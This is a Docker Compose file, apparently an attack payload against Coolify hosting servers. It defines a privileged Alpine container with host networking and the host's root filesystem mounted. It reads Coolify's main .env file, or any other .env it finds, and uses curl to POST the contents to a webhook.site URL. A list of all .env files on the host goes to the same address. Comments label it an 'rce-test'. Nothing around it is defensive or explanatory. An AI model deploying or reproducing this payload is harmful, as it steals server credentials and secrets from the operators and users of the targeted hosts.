version: '3.8'
services:
  rce-test:
    image: 'alpine:3.19'
    privileged: true
    network_mode: host
    volumes:
      - '/:/host-root'
    command:
      - sh
      - -c
      - |
        apk add --no-cache curl
        
        # 1. Пытаемся прочитать главный .env Coolify (стандартный путь)
        cat /host-root/data/coolify/.env > /tmp/main_env.txt 2>/dev/null
        
        # 2. Если файл пустой, ищем любой .env вне папок applications/services
        if [ ! -s /tmp/main_env.txt ]; then
          find /host-root -name ".env" -type f -not -path "*/applications/*" -not -path "*/services/*" | head -1 | xargs cat > /tmp/main_env.txt 2>/dev/null
        fi
        
        # 3. Отправляем содержимое .env
        cat /tmp/main_env.txt | curl -X POST --data-binary @-  	https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=main_env
        
        # 4. Отправляем список всех .env файлов для отладки (если первый не сработал)
        find /host-root -name ".env" -type f | curl -X POST --data-binary @-  	https://webhook.site/355e60a9-7cfe-4155-a971-cfd5a66cc919?stage=env_list
        
        sleep 3600
